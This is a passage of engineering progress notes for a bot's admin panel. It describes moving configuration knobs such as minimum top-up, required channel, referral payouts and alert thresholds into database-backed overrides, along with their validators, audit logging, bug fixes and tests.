  plus a derived-Toman line (`MIN_TOPUP_USD × FX rate`).
- Sidebar nav link in `templates/admin/_layout.html`
  (`active_page == 'wallet_config'`).
- Audit label `"wallet_config_min_topup_update"` in
  `AUDIT_ACTION_LABELS`; both set + clear paths record an audit
  row with `before/before_source/after/after_source`.
- 13 web-surface tests in `tests/test_web_admin.py`
  (`test_wallet_config_*`).

**Resolution of the test-isolation `ServerDisconnectedError`** —
the suggested fix in §10b.1 worked: `wallet_config_get` reads the
FX snapshot via `request.app[APP_KEY_DB].get_fx_snapshot()` directly
instead of calling `fx_rates.get_usd_to_toman_snapshot()`, which
in tests would fall through to the module-level `database.db`
singleton whose `pool` is `None` and raise `AttributeError` on
`pool.acquire()`. The new `_read_toman_per_usd_from_db(db)` helper
also defends against the AsyncMock-returns-AsyncMock case (where
`float(MagicMock)` returns 1.0) by validating the snapshot tuple
shape before consuming it. Full suite green:
2676 passed (was 2663 before PR-2b).

**Reusable patterns shipped here** — when implementing rows
#5/#6/#7 (REQUIRED_CHANNEL, FREE_MESSAGES_PER_USER, REFERRAL_*),
or any other DB-backed override editor:

- Mirror `payments._coerce_min_topup` for input validation
  (numeric parse + finite check + range check, return None on bad).
- Mirror `payments.set_min_topup_override` /
  `payments.clear_min_topup_override` /
  `payments.refresh_min_topup_override_from_db(db)` /
  `payments.get_min_topup_source()` for the in-process cache layer.
- Mirror `_build_min_topup_view` for the per-source breakdown
  passed to the template.
- Mirror `_wallet_config_csrf_guard` /
  `wallet_config_min_topup_post` for the POST handler shape
  (CSRF guard → blank-value clears via `delete_setting` →
  parse-and-validate → `upsert_setting` + `set_*_override` →
  `refresh_*_from_db` → audit row → flash + redirect).
- Add a new entry to `AUDIT_ACTION_LABELS` for the slug.
- Reuse `_read_toman_per_usd_from_db(db)` if the page needs to
  render a derived Toman figure (do **not** call
  `fx_rates.get_usd_to_toman_snapshot()` directly inside an admin
  handler — see resolution note above).
- Defensive POST testing must cover: requires-auth (302→login),
  CSRF mismatch, happy path persists+refreshes+audit, blank
  clears override, parametrized invalid (NaN/Inf/-1/non-numeric),
  above-maximum rejected, and DB-failure-preserves-cache.

---

### §10b.2 — Row #5 (REQUIRED_CHANNEL web surface) — shipped

**Context (closed 2026-05-02):** This PR shipped the full row in one
swing — DB-backed override layer in `force_join.py`, boot warm-up in
`main.py`, and the `/admin/control` editor card — because
`REQUIRED_CHANNEL` is a single string knob (no derived figure to
co-render the way `MIN_TOPUP_TOMAN` derives off `MIN_TOPUP_USD`), so
splitting into PR-2a / PR-2b would have been ceremony.

**What's wired:**

- `_normalise_channel(raw)` — pulled out of the original
  `get_required_channel()` so the env path, the DB path, and the
  web admin form validator all share the exact same canonicalisation
  rules (strip / `@`-prefix / numeric-id passthrough / 64-char cap).
- `_coerce_required_channel(value)` — strict validator for the
  override slot. Refuses non-string / over-cap. **Important: returns
  the empty string verbatim** when the input is blank, because `""`
  IS a valid override value (operator forcing the gate OFF). Only
  `None` means "no override at all".
- `set_required_channel_override(value)` /
  `clear_required_channel_override()` /
  `get_required_channel_override()` /
  `refresh_required_channel_override_from_db(db)` /
  `get_required_channel_source()` — full mirror of the
  `payments.set_min_topup_override` / `pricing.set_markup_override`
  surface.
- `get_required_channel()` now consults `_REQUIRED_CHANNEL_OVERRIDE`
  first; the env var is still the second-tier fallback.
- `main.start_webhook_server` warms the override cache directly
  after the `MIN_TOPUP_USD` warm-up. Fail-soft — a transient DB
  blip leaves the cache empty and `get_required_channel()` falls
  through to env / "" rather than crashing the boot.
- `/admin/control` GET refreshes the override on every render
  (mirror of the threshold-overrides refresh) so a tweak made on a
  different replica lands on the panel without a restart.
- `_build_required_channel_view()` returns the per-source breakdown
  (effective / source / override_value / env_value / env_raw /
  max_length). The override slot can store `None` ("not set"),
  `""` ("force OFF"), or a canonical handle ("`@channel`" / numeric
  id) — the template renders all three distinctly.
- `control_required_channel_post` handles both the `set` and `clear`
  actions. The form has two distinct submit buttons so an operator
  can't accidentally blank the field and trigger an unintended
  clear. Audit slug `control_required_channel_update` records
  `before/before_source/after/after_source` plus the `action`.

**Reusable patterns this shipment adds (on top of §10b.1) for any
DB-backed override editor whose key is a STRING (not a number):**

- Allow the override slot to legitimately store the empty string —
  `""` distinct from `None` lets an operator force a feature OFF
  without editing the env file.
- Use two submit buttons (`action=set` / `action=clear`) instead of
  conflating "blank field == clear" the way `MIN_TOPUP_USD` does.
  The min-topup floor has a sensible default (`$2.00`); a force-join
  channel handle does not — and conflating "operator wants to type
  a new handle but tabbed past the field" with "operator wants to
  drop the override entirely" is a footgun.
- Cap the field length at module scope
  (`REQUIRED_CHANNEL_MAX_LENGTH = 64`) and surface the cap on the
  `<input maxlength=…>`. The DB column is `TEXT` so unbounded
  values *would* persist; an explicit ceiling is defence in depth
  matching the `set_admin_role` notes pattern.

---

### §10b.3 — Row #7 (REFERRAL_BONUS_* web surface) — shipped

**Context (closed 2026-05-02):** Row #7 covers two coupled knobs —
`REFERRAL_BONUS_PERCENT` (default `10.0`) and `REFERRAL_BONUS_MAX_USD`
(default `5.0`) — that gate the per-side payout when an invitee's
first paid top-up triggers a referral grant. Both were env-only
(`_safe_float_env` in `referral.py`), forcing a redeploy to retune
payouts. This PR shipped both knobs in one swing because (a) they
share a single product decision (a percent change typically goes
hand-in-hand with a cap re-check) and (b) the editor card hosts
them together so an operator sees the combined effective payout
("X% capped at $Y") at a glance.

**Why this row over #6 / #8 / #9 / #10 / #11:** Row #6
(`FREE_MESSAGES_PER_USER`) is mis-labelled in the table — there is
no env knob for it today; the default is hardcoded as `INT DEFAULT
10` in the baseline migration. Lifting it would be a NEW knob, not
an env-to-DB lift, and the wallet-economy module that should host
the override doesn't exist yet — bigger surface than rows #5 / #7.
Rows #8, #9, #10, #11 each share that "host module doesn't exist"
or "no panel real estate yet" friction. Row #7 reuses the
already-shipped `/admin/wallet-config` page and the existing
`referral.py` module — same cost / effort as row #5 (one PR,
one card, one audit slug).

**What's wired:**

- `referral.py`
  - `REFERRAL_BONUS_PERCENT_SETTING_KEY` /
    `REFERRAL_BONUS_MAX_USD_SETTING_KEY` — the
    `system_settings.key` slugs the override layer reads / writes.
  - `REFERRAL_BONUS_PERCENT_MAXIMUM` (`100.0`, exclusive) /
    `REFERRAL_BONUS_MAX_USD_MAXIMUM` (`1000.0`, exclusive) — hard
    upper-bound caps so a fat-finger can't lock the feature in a
    state where every paid top-up grants a runaway payout.
  - `_coerce_referral_bonus_percent(value)` /
    `_coerce_referral_bonus_max_usd(value)` — strict validators.
    Refuse `bool`, non-numeric, non-finite, non-positive, or
    above-cap values. Return `None` on rejection (same shape as
    `payments._coerce_min_topup`).
  - `set_referral_bonus_percent_override` /
    `clear_referral_bonus_percent_override` /
    `get_referral_bonus_percent_override` /
    `refresh_referral_bonus_percent_override_from_db(db)` — full
    mirror of the COST_MARKUP / MIN_TOPUP_USD surface.
  - `set_referral_bonus_max_usd_override` /
    `clear_referral_bonus_max_usd_override` /
    `get_referral_bonus_max_usd_override` /
    `refresh_referral_bonus_max_usd_override_from_db(db)` — same
    for the cap.
  - `get_referral_bonus_percent()` /
    `get_referral_bonus_max_usd()` now consult the override slot
    first; the env var stays the second-tier fallback. Existing
    callers (`grant_referral_after_credit` ⇒
    `Database._grant_referral_in_tx`) pick up the override
    automatically because they already route through these
    helpers.
  - `get_referral_bonus_percent_source` /
    `get_referral_bonus_max_usd_source` — return `db` / `env` /
    `default` for the panel badges.
- `main.py`
  - Two boot warm-up calls right after the `REQUIRED_CHANNEL`
    warm-up, in independent `try/except` blocks so a malformed
    row in one knob doesn't poison the other.
- `web_admin.py`
  - `_build_referral_view()` returns the per-source breakdown for
    both knobs, mirroring `_build_min_topup_view` / `_build_markup_view`.
  - `wallet_config_get` now refreshes both referral overrides on
    every render (in addition to the existing min-topup refresh)
    and threads `referral_view` through the template ctx.
  - `wallet_config_referral_post` handles both `action=set`
    (validate + persist + refresh both knobs independently) and
    `action=clear` (drop the DB row(s) listed in the multi-select
    `targets` field). Audit slug `wallet_config_referral_update`
    records the diff (`before_*`, `after_*`, plus the
    `submitted_*` raw values for "set" or `cleared` list for
    "clear").
- `templates/admin/wallet_config.html`
  - New "🎁 Referral payouts" card under the existing minimum
    top-up card. Two-column table for percent / cap with the
    same effective / db / env / default rows. Two forms — one for
    "Save", one for "Clear selected" with multi-checkboxes for
    which knob(s) to drop.

**Reusable patterns this shipment adds (on top of §10b.1 / §10b.2)
for any DB-backed override editor that gates TWO coupled knobs:**

- One module hosts both override caches with parallel
  `set_*` / `clear_*` / `get_*_override` / `refresh_*_from_db`
  surfaces (no shared state between them) so a malformed row in
  one knob doesn't poison the other. Both warm-up `try/except`
  blocks in `main.py` are also independent.
- One editor card hosts both knobs with shared header
  ("Effective: X% capped at $Y") so the operator can sanity-check
  the combined effect before submitting.
- One **Save** form (per-input "leave blank to keep this knob
  alone" semantics) plus one **Clear** form with multi-checkbox
  targets. This avoids the "blank means clear" footgun from
  §10b.1 while still letting the operator drop the override on
  either knob independently.
- One audit slug per editor card (`wallet_config_referral_update`),
  not one per knob. The audit `meta` dict carries before / after /
  source for BOTH knobs so a future investigation can answer "what
  did the operator change at 14:32?" with one row.

---

### §10b.4 — Row #21 (BOT_HEALTH_ALERT_INTERVAL_SECONDS web surface) — shipped

The §10b row #21 ship (PR #173) lifts the bot-health alert-loop
cadence into a `system_settings` overlay so an operator can re-tune
how often the alert loop wakes up to classify the bot's health and
DM the operator on a bad-state transition — without a redeploy. The
loop re-reads the resolved cadence on every iteration so a saved
override is live within at most one tick.

Pattern: same as §10b.2 (REQUIRED_CHANNEL) and §10b.3
(REFERRAL_BONUS_*) — env-knob → DB-backed override layer →
boot warm-up → editor card on the existing `/admin/control` page.

Module-level surface added in `bot_health_alert.py`:

- `_INTERVAL_OVERRIDE` cache + `_coerce_alert_interval` validator
  with explicit `bool` rejection (`isinstance(value, bool)` BEFORE
  `int` check — `True` is an int subclass).
- Bounds: `INTERVAL_MINIMUM = 1` (mirrors the env-side minimum),
  `INTERVAL_OVERRIDE_MAXIMUM = 86_400` (24h cap so a fat-finger like
  `86400000` intended `60` can't silently disable alerting for a
  month).
- Public accessors `set_alert_interval_override` /
  `clear_alert_interval_override` /
  `get_alert_interval_override` /
  `refresh_alert_interval_override_from_db` /
  `reset_alert_interval_override_for_tests`.
- Source resolver `get_bot_health_alert_interval_source` returns
  `db` / `env` / `default` exactly like the other knobs, so the
  panel can re-use the existing badge.

Loop integration:

- `_alert_loop` re-reads `get_bot_health_alert_interval_seconds()`
  at the bottom of every iteration so a saved override takes effect
  on the next tick. The very first tick after boot uses the value
  from the `main.py` warm-up (see below).
- `_sync_registered_cadence(cadence_seconds)` pushes the resolved
  cadence into `bot_health.LOOP_CADENCES` after every change so the
  panel's per-loop "stale threshold" calculation tracks the loop's
  actual sleep duration.

Bundled bug fix (`bot_health.py`):

- New public helper `update_loop_cadence(name, cadence_seconds) ->
  int` (Stage-15-Step-E #10b row 21). Pre-fix, the panel computed
  the stale threshold as `2 × cadence + 60` from the **registered**
  cadence (set once at decorator-time), so an operator who tuned
  `BOT_HEALTH_ALERT_INTERVAL_SECONDS` to 600 would see the alert
  loop forever flagged "running late" or "overdue" because the
  panel still believed cadence was the compile-time default. The
  helper validates name + cadence (rejects empty / non-str / bool /
  non-positive / non-int), updates `LOOP_CADENCES` in place, and
  raises `KeyError` for unknown loop names so a typo at the call
  site doesn't silently no-op. `_sync_registered_cadence` calls it
  on every cadence change. Reusable for any future per-loop cadence
  knob (rows §10b row #11 will use it too).

`main.py` warm-up:

- New `try/except` block that calls
  `bot_health_alert.refresh_alert_interval_override_from_db(db)` so
  the very first tick of the alert loop uses the operator's
  configured cadence rather than the env / compile-time default.
  Fail-soft; falls through to env / default on a transient DB blip.

`web_admin.py`:

- New `_build_alert_interval_view()` returns a single dict with
  `effective` / `source` / `override_value` / `env_value` /
  `env_raw` / `default_value` / `minimum` / `maximum`.
- `control_get` calls
  `bot_health_alert.refresh_alert_interval_override_from_db(db)`
  on every render and threads `alert_interval` through the
  template ctx.
- `control_alert_interval_post` handles both `action=set` (validate
  + upsert + apply) and `action=clear` (drop the DB row + clear the
  in-process cache). Audit slug `control_alert_interval_update`
  records the diff. Route registered as
  `POST /admin/control/alert-interval` with `_require_role(ROLE_SUPER)`.
- New `AUDIT_ACTION_LABELS` entry
  `"control_alert_interval_update": "Bot-health alert interval updated"`
  so the `/admin/audit` filter dropdown surfaces alert-cadence
  changes.

`templates/admin/control.html`:

- New "⏱ Alert-loop cadence" card under the "📢 Required channel"
  card. Same effective / db / env / default rows; HTML5 `number`
  input with `min` / `max` set from
  `INTERVAL_MINIMUM` / `INTERVAL_OVERRIDE_MAXIMUM` for client-side
  validation. Two submit buttons ("Save cadence" / "Clear DB
  override") so the operator can't accidentally blank the field
  and trigger an unintended clear.

Tests added:

- `tests/test_bot_health_alert.py` — 27 new tests covering coerce
  / set / clear / get / refresh-from-DB (happy path + DB-blip +
  malformed-row branches), source resolver across all
  db/env/default combinations, and `_sync_registered_cadence`
  cadence-update + unknown-loop fail-safe.
- `tests/test_bot_health.py` — 10 new tests covering
  `update_loop_cadence` validation matrix + the bundled bug-fix
  regression (`test_update_loop_cadence_changes_stale_threshold`).
- `tests/test_web_admin.py` — 12 new tests covering the new POST
  handler (auth / CSRF / persist / clear / below-minimum /
  above-max / non-int / blank-set / unknown-action / DB-blip),
  the GET-render card, and the audit-slug regression.

### §10b.5 — Row #9 (PENDING_EXPIRATION_HOURS web surface) — shipped

**Diagnosis.** `PENDING_EXPIRATION_HOURS` (default 24h) was env-only:
operators who wanted to widen / shrink the pending-PENDING
expiration window had to redeploy. The reaper loop in
`pending_expiration._expiration_loop` already runs forever, so
flipping the threshold via a DB-backed override + iteration-time
re-read is enough — no restart needed.

**Surface.** `/admin/control` already had two `system_settings`
editors (REQUIRED_CHANNEL, BOT_HEALTH_ALERT_INTERVAL_SECONDS), so
this PR slots a third card next to them — same pattern (effective /
source / override / env table + Save / Clear submit pair). The
panel + the loop both call `pending_expiration.get_pending_expiration_hours`
so they cannot disagree about the live threshold.

**DB layer.** `pending_expiration.py` gains the same shape as the
Row-#21 / Row-#5 / Row-#7 / Row-#4 layers:

- `EXPIRATION_HOURS_SETTING_KEY = "PENDING_EXPIRATION_HOURS"`,
  `EXPIRATION_HOURS_DEFAULT = 24`, `EXPIRATION_HOURS_MINIMUM = 1`,
  `EXPIRATION_HOURS_OVERRIDE_MAXIMUM = 24 * 365` (1-year cap so a
  fat-finger like `876000` (intended `168`) can't silently disable
  the reaper for the rest of the deploy lifetime).
- `_coerce_expiration_hours(value)` — explicit `bool` rejection
  (so a stored `"true"` / `"True"` row can't shrink the window to
  1h and EXPIRE most of the legit-but-slow PENDING invoices), int
  coercion, range check.
- `set_/clear_/get_expiration_hours_override()` — module-level
  cache slot; `set_*` re-validates as defence-in-depth.
- `refresh_expiration_hours_override_from_db(database)` — async,
  best-effort. Transient `get_setting` error keeps the cache value
  in place (logs at ERROR). Malformed value (non-int, below min,
  above max) clears the cache (logs at WARNING). Returns the new
  cache value.
- `get_pending_expiration_hours()` — DB → env → default precedence.
- `get_pending_expiration_hours_source()` — returns
  `"db" / "env" / "default"`.
- `reset_expiration_hours_override_for_tests()` — test helper.

**Loop re-read.** `_expiration_loop` now re-reads the threshold via
`get_pending_expiration_hours` on every iteration, so a saved DB
override takes effect on the next tick — no restart required. The
existing `threshold_hours` kwarg is retained as the bootstrap value
for the very first iteration (mirrors `bot_health_alert._alert_loop`).

**Boot warm-up.** `main.py` now calls
`pending_expiration.refresh_expiration_hours_override_from_db(db)`
after the bot-health alert interval warm-up so the very first reaper
tick after boot uses the operator's configured threshold. Best-effort
— a startup DB blip falls through to env / default and logs
`failed to load PENDING_EXPIRATION_HOURS override from DB`.

**Web surface.**

- `_build_expiration_hours_view()` returns a single-knob view dict
  (`effective` / `source` / `override_value` / `env_value` /
  `env_raw` / `default_value` / `minimum` / `maximum`) and is
  bound to the `expiration_hours` template var.
- `control_get` calls `refresh_expiration_hours_override_from_db`
  on every page render so a DB poke from another admin instance
  becomes visible in this process within one HTTP round-trip.
- `control_expiration_hours_post` (`POST
  /admin/control/expiration-hours`, `ROLE_SUPER`) — CSRF guard,
  action allowlist (`set` / `clear`), coerce + range-check,
  upsert / delete `system_settings`, refresh cache, audit row
  `control_expiration_hours_update` with `meta = {action, before,
  before_source, after, after_source}`, redirect with flash.
- Audit slug `control_expiration_hours_update` =
  `"Pending-expiration window updated"` registered in
  `AUDIT_ACTION_LABELS` so `/admin/audit` filter dropdown
  surfaces this row type.
- `templates/admin/control.html` gets a new card with a number
  input bounded by `min`/`max` from the view, two distinct submit
  buttons (`action=set` and `action=clear`), and a status table
  matching the alert-interval card.

**Bundled bug fix #1.** `_record_expiration_audit()` now logs
`threshold_hours_used` in `meta` so investigators can later tell
whether an EXPIRED row was reaped under the default 24h or a
custom override. Pre-fix the audit row carried no threshold
metadata, which meant a question like "did we expire a paid invoice
because the window was set too aggressively?" was unanswerable
weeks after the fact. Now every audit row pins the exact threshold
the reaper used for that batch, so you can reconcile EXPIRED rows
against the operator's `control_expiration_hours_update` audit
trail.

**Bundled bug fix #2.** `_tick_pending_reaper_from_app()` (the
"Tick now" button on `/admin/control`) now routes through
`get_pending_expiration_hours()` instead of `_read_int_env()`. Pre-
fix the manual tick path read the env var directly, which would
have made it silently bypass any DB override the operator had
applied — surprising and inconsistent with the loop's iteration-
time behaviour. Now the manual tick agrees with the loop.

**Tests.** All running, all green:

- `tests/test_pending_expiration.py` — 31 new tests covering
  coerce / set / clear / get / refresh-from-DB / source resolver /
  loop bootstrap re-read / manual-tick path consistency / audit
  meta carries `threshold_hours_used`.
- `tests/test_web_admin.py` — 12 new tests covering the new POST
  handler (auth / CSRF / persist / clear / below-minimum /
  above-max / non-int / blank-set / unknown-action / DB-blip),
  the GET-render card, and the audit-slug regression.

### §10b.6 — Row #10 (PENDING_ALERT_THRESHOLD_HOURS web surface) — shipped

**Diagnosis.** `PENDING_ALERT_THRESHOLD_HOURS` (default 2h) was
env-only: operators who wanted to retune the "stuck-PENDING" alert
line had to redeploy. The pending-alert loop in
`pending_alert._alert_loop` already runs forever, so flipping the
threshold via a DB-backed override + iteration-time re-read is
enough — no restart needed.

**Surface.** `/admin/control` already had four `system_settings`
editors (REQUIRED_CHANNEL, BOT_HEALTH_ALERT_INTERVAL_SECONDS,
PENDING_EXPIRATION_HOURS, the cluster of kill-switch toggles), so
this PR slots a fifth card next to them — same pattern as Row #9
(effective / source / override / env table + Save / Clear submit
pair). The dashboard tile, the panel, and the loop all call
`pending_alert.get_pending_alert_threshold_hours()` so they cannot
disagree about "what counts as overdue".

**DB layer.** `pending_alert.py` gains the same shape as the
Row-#9 / Row-#21 / Row-#5 / Row-#7 / Row-#4 layers:

- `ALERT_THRESHOLD_SETTING_KEY = "PENDING_ALERT_THRESHOLD_HOURS"`,
  `ALERT_THRESHOLD_DEFAULT = 2`, `ALERT_THRESHOLD_MINIMUM = 1`,
  `ALERT_THRESHOLD_OVERRIDE_MAXIMUM = 24 * 365` (1-year cap; the
  threshold is logically smaller than the reaper's cap but the
  slot is bounded by the reaper's cap to stay consistent with
  the Row-#9 layer).
- `_coerce_alert_threshold_hours(value)` — explicit `bool`
  rejection (so a stored `"true"` row can't coerce to `1` and shrink
  the threshold to "anything PENDING for an hour is suspicious",
  paging admins constantly), int coercion, range check.
- `set_/clear_/get_alert_threshold_override()` — module-level
  cache slot; `set_*` re-validates as defence-in-depth.
- `refresh_alert_threshold_override_from_db(database)` — async,
  best-effort. Transient `get_setting` error keeps the cache value
  in place (logs at ERROR). Malformed value (non-int, below min,
  above max) clears the cache (logs at WARNING). Returns the new
  cache value.
- `get_pending_alert_threshold_hours()` — DB → env → default
  precedence.
- `get_pending_alert_threshold_source()` — returns
  `"db" / "env" / "default"`.
- `reset_alert_threshold_override_for_tests()` — test helper.

**Loop re-read.** `_alert_loop` now re-reads the threshold via
`get_pending_alert_threshold_hours()` on every iteration (after the
sleep and before the next pass), so a saved DB override takes effect
on the next tick — no restart required. The existing
`threshold_hours` kwarg is retained as the bootstrap value for the
very first iteration (mirrors `pending_expiration._expiration_loop`
and `bot_health_alert._alert_loop`).

**Boot warm-up.** `main.py` now calls
`pending_alert.refresh_alert_threshold_override_from_db(db)` after
the Row-#9 expiration warm-up so the very first pending-alert tick
after boot uses the operator's configured threshold. Best-effort —
a startup DB blip falls through to env / default and logs
`failed to load PENDING_ALERT_THRESHOLD_HOURS override from DB`.

**Web surface.**

- `_build_alert_threshold_view()` returns a single-knob view dict
  (`effective` / `source` / `override_value` / `env_value` /
  `env_raw` / `default_value` / `minimum` / `maximum`) and is bound
  to the `alert_threshold` template var.
- `control_get` calls `refresh_alert_threshold_override_from_db`
  on every page render so a DB poke from another admin instance
  becomes visible in this process within one HTTP round-trip.
- `control_alert_threshold_post` (`POST
  /admin/control/alert-threshold`, `ROLE_SUPER`) — CSRF guard,
  action allowlist (`set` / `clear`), coerce + range-check, upsert
  / delete `system_settings`, refresh cache, audit row
  `control_alert_threshold_update` with `meta = {action, before,
  before_source, after, after_source}`, redirect with flash.
- Audit slug `control_alert_threshold_update` =
  `"Pending-alert threshold updated"` registered in
  `AUDIT_ACTION_LABELS` so `/admin/audit` filter dropdown
  surfaces this row type.
- `templates/admin/control.html` gets a new card with a number
  input bounded by `min`/`max` from the view, two distinct submit
  buttons (`action=set` and `action=clear`), and a status table
  matching the Row-#9 expiration card.

**Bundled defensive measure.** `_alert_loop` wraps the iteration-
time re-read of `get_pending_alert_threshold_hours()` in a
`try/except` that falls back to the previous threshold (logged at
ERROR) rather than letting a transient resolver blip propagate up
and starve the loop. Pre-Row-#10, the threshold was captured once
at boot and never re-read, so this failure mode didn't exist; the
new re-read site introduces it, so we defensively handle it. Pinned
by `test_alert_loop_keeps_previous_threshold_when_resolver_raises`.

**Tests.** All running, all green:

- `tests/test_pending_alert.py` — 35 new tests covering
  coerce / set / clear / get / refresh-from-DB / source resolver /
  loop iteration-time re-read (happy path + resolver-raises) /
  bootstrap respects override / manual-tick path consistency.
- `tests/test_web_admin.py` — 12 new tests covering the new POST
  handler (auth / CSRF / persist / clear / below-minimum /
  above-max / non-int / blank-set / unknown-action / DB-blip),
  the GET-render card, and the audit-slug regression.

### §10b.7 — Row #11 (per-loop stale-threshold web surface) — shipped

**Diagnosis.** Per-loop stale thresholds
(`BOT_HEALTH_LOOP_STALE_<UPPER_NAME>_SECONDS`, e.g.
`BOT_HEALTH_LOOP_STALE_FX_REFRESH_SECONDS=900`) were env-only.
Operators who needed to widen one specific loop's freshness
window — e.g. a slow-syncing gateway is legitimately late and
falsely tripping `DEGRADED` on the panel for `zarinpal_backfill`,
or a long-cadence job's `2 × cadence + 60s` default isn't right
for the deploy — had to redeploy. The four global knobs from
Stage-15-Step-F's threshold editor (busy-inflight, legacy single
loop-stale, IPN drop attack, login throttle attack) are not
per-loop, so the existing card couldn't cover this gap.

**Surface.** A new "⏱ Per-loop stale thresholds" card on
`/admin/control` next to the existing four control-panel cards,
rendering one row per registered loop with `effective` / `source`
/ `cadence` / `cadence-derived` / `DB override` / `env value` /
inline Save+Clear form. The classifier, the panel tile, and
Prometheus heartbeats all read the resolved threshold via
`bot_health.loop_stale_threshold_seconds(name)` so they cannot
disagree.

**DB layer.** `bot_health.py` gains a second cache parallel to
`_THRESHOLD_OVERRIDES`:

- `LOOP_STALE_OVERRIDE_MINIMUM = 1` (matches the global key's
  minimum) and `LOOP_STALE_OVERRIDE_MAXIMUM = 86_400 × 7` (1
  week — wide enough for daily-cadence loops with multi-day
  backoff, narrow enough to reject a `604_800_000` ms-instead-of-s
  typo at validation rather than silently disabling stale
  detection forever).
- `_LOOP_STALE_OVERRIDES: dict[str, int]` — keyed by loop name
  (e.g. `"fx_refresh"` → `600`).
- `loop_stale_setting_key(name)` — single source of truth for the
  `BOT_HEALTH_LOOP_STALE_<UPPER>_SECONDS` shape so the env path,
  the DB path, and the panel template can't drift.
- `_coerce_loop_stale_seconds(value)` — explicit `bool` rejection
  (so a stored `"true"` row can't coerce to `1` and shrink every
  loop's freshness window to 1s, painting the whole panel red),
  int coercion, range check.
- `set_/clear_/get_loop_stale_override(name)` and
  `get_loop_stale_overrides_snapshot()` — module-level cache
  helpers; `set_*` re-validates as defence-in-depth.
- `refresh_loop_stale_overrides_from_db(database)` — async,
  best-effort. Transient `list_settings_with_prefix` error keeps
  the cache in place (logs at ERROR). Skips the legacy
  `BOT_HEALTH_LOOP_STALE_SECONDS` key (owned by the global
  threshold cache). Atomic swap so a partial update can't leave
  half-loaded state.
- `_stale_threshold_seconds(name, ...)` consults
  `_LOOP_STALE_OVERRIDES` BEFORE the env var so a saved DB value
  cannot be silently shadowed by a stale env override left behind
  on a previous deploy.
- `loop_stale_source(name)` — returns
  `"db" / "env" / "cadence" / "default"` so the panel can render
  the same source badge it uses for the global threshold card.
- `reset_loop_stale_overrides_for_tests()` — test helper.

**Boot warm-up.** `main.py` now calls
`refresh_loop_stale_overrides_from_db(db)` after the Row-#10
warm-up so the very first `compute_bot_status` call after boot
sees the operator's per-loop overrides rather than reverting to
env / cadence-derived for one render. Best-effort — a startup DB
blip logs `failed to load BOT_HEALTH_LOOP_STALE_*_SECONDS
overrides from DB`.

**Web surface.**

- `_build_loop_stale_view()` returns
  `{"rows": [...], "minimum": ..., "maximum": ...}` where each
  row carries `name` / `setting_key` / `cadence_s` /
  `cadence_derived_s` / `env_value` / `env_raw` / `override_value`
  / `effective` / `source`. Iterates `metrics._LOOP_METRIC_NAMES`
  so a future loop registered via
  `bot_health.register_loop` automatically gets a row without
  touching this module.
- `control_get` calls `refresh_loop_stale_overrides_from_db` on
  every page render so a DB poke from another admin instance
  becomes visible in this process within one HTTP round-trip.
- `control_loop_stale_post` (`POST /admin/control/loop-stale`,
  `ROLE_SUPER`) — CSRF guard, action allowlist (`set` / `clear`),
  loop-name validation against `metrics._LOOP_METRIC_NAMES` (a
  typo or malicious POST is rejected before it can write a
  `BOT_HEALTH_LOOP_STALE_*_SECONDS` row that no real loop reads),
  coerce + range-check, upsert / delete `system_settings`,
  refresh cache, audit row `control_loop_stale_update` with
  `meta = {action, loop, setting_key, before, before_source,
  after, after_source}`, redirect with flash.
- Audit slug `control_loop_stale_update` =
  `"Per-loop stale threshold updated"` registered in
  `AUDIT_ACTION_LABELS` so `/admin/audit` filter dropdown
  surfaces this row type.
- `templates/admin/control.html` gets the new card with one row
  per loop, source badge, and inline Save/Clear form bounded by
  `loop_stale.minimum` / `loop_stale.maximum`.

**Bundled bug fix.** Pre-row-11,
`refresh_threshold_overrides_from_db` did
`(value or "").strip()` on every row — which `AttributeError`-ed
on a non-string-non-None row in `system_settings` (e.g. an int
written by a future `upsert_setting` overload, or a historical
row left over from a different schema). The whole refresh would
then bubble up to the caller and leave the override cache
half-loaded — every key after the bad row would silently fall
through to env / default for that load. The fix:

- New `_coerce_setting_to_str(key, value)` helper coerces `None →
  ""`, str through, anything else via `str()`, falling back to
  `""` if even `str()` fails. Logs at WARNING for non-coercible
  rows so the bad row is visible without aborting the load.
- `refresh_threshold_overrides_from_db` now goes through
  `_coerce_setting_to_str(...).strip()`. The new `refresh_loop_
  stale_overrides_from_db` uses the same helper from day one.
- Pinned by `test_refresh_threshold_overrides_skips_non_string_row`.

**Tests.** All running, all green (2971 passed, 9 skipped — was
2942 baseline, +29 new):

- `tests/test_bot_health.py` — 22 new tests covering the per-loop
  override layer (round-trip / minimum / maximum / bool rejection
  / empty name / clear-returns-bool / DB-beats-env / env-when-no-DB
  / cadence-when-no-overrides / classifier integration / refresh
  loads + skips legacy + handles DB failure + handles None DB)
  plus 1 regression test for the bundled
  `refresh_threshold_overrides_from_db` non-str-row bug fix.
- `tests/test_web_admin.py` — 12 new tests covering the new POST
  handler (auth / CSRF / persist / clear / below-minimum /
  above-max / unknown-loop / blank-set / unknown-action / DB-blip
  / requires-super), the GET-render card, the source-badge
  rendering, and the audit-slug regression.

---

### §10b.8 — Row #12 (COST_MARKUP history & analytics) — shipped

**Symptom (pre-shipment).** The `/admin/monetization` lifetime /
window cards apply *today's* `COST_MARKUP` uniformly to every
historical `usage_logs` row when computing the "implied OpenRouter
cost". The page footnotes the assumption ("if you've changed
`COST_MARKUP` recently the lifetime number drifts; the
rolling-window numbers are more reliable") but the operator had
no way to actually answer the question the markup editor was
designed for: *did the last markup change pay for itself?* The
audit log was already capturing every `monetization_markup_update`
POST with `meta = {action, before, before_source, after,
after_source}`, but nothing read it back.

**Diagnosis.** The data was already there — we just needed two
new read paths:

1. A flat history table for "when did the markup change and who
   did it?" — sourced directly from
   `admin_audit_log WHERE action = 'monetization_markup_update'`.
2. A per-era revenue-attribution rollup for "did each era pay for
   itself at *its own* markup?" — sourced from the same audit-log
   timestamps used as bucket boundaries against `usage_logs`.

**Surface (DB).** Two new methods in `database.py`:

* `Database.list_markup_history(limit=50)` — returns a list of
  `{id, ts, actor, kind, before, before_source, after,
  after_source, ip}` rows newest-first. The `meta` JSONB column
  is decoded via the existing `_decode_jsonb_meta` helper, which
  already isolates a single corrupt row from blanking the entire
  feed (the `_finite_float_or_none` coercion below extends that
  fault-isolation to the typed numeric fields).
* `Database.get_markup_eras(limit=10)` — derives one synthetic
  "current" era + N historical eras from the markup-update audit
  rows, then in a single SQL pass aggregates
  `cost_deducted_usd` / `COUNT(*)` from `usage_logs` per era via
  a `CASE` expression that buckets each row into its
  containing-era index. Each era's implied OpenRouter cost is
  computed against *that era's* markup (not today's). A fresh
  deploy with no audit rows yet produces a single synthetic
  current era spanning the entire `usage_logs` table at the live
  markup, via the `_single_current_era` helper.

